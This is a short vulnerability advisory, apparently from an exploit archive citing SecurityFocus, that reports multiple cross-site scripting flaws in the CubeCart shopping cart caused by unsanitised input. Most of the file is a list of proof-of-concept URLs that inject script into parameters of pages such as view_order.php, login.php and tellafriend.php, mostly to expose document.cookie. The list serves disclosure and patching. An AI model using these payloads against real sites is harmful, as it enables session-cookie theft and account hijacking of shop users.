@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/12658/info
+
+
+CubeCart is affected by multiple cross-site scripting vulnerabilities; an upgrade is available.
+
+These issues exist because the application fails to properly sanitize user-supplied input.
+
+As a result of these vulnerabilities, it is possible for a remote attacker to create a malicious link containing script code that will be executed in the browser of an unsuspecting user when followed. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/cubecart/?"><script>alert(document.cookie);</script>
+http://www.example.com/cubecart/view_order.php?cat_id=1"><script>alert(document.cookie);</script>
+http://www.example.com/cubecart/forgot_pass.php?catname='pruebas1'"><script>alert(document.cookie);</script>
+http://www.example.com/cubecart/index.php?cat_id=5"><body><p><h1>CubeCart XSS Pow@ !!!</h1></p>/<body>
+http://www.example.com/cubecart/view_order.php?session=1"><script>alert(document.cookie);</script>
+http://www.example.com/cubecart/view_order.php?product=1"><script>alert(document.cookie);</script>
+http://www.example.com/cubecart/your_orders.php?cat_id="><script>document.write(document.cookie)</script>
+http://www.example.com/cubecart/view_product.php?product=1"><script>alert(document.cookie);</script>
+http://www.example.com/cubecart/tellafriend.php?product=1&session="><script>alert(document.cookie)</script>
+http://www.example.com/cubecart/tellafriend.php?product=1"><script>document.write(document.cookie)</script>
+http://www.example.com/cubecart/login.php?session="><script>alert(document.cookie);</script>
+http://www.example.com/cubecart/search.php?search=".,script.alert(document.cookie)</script>
+
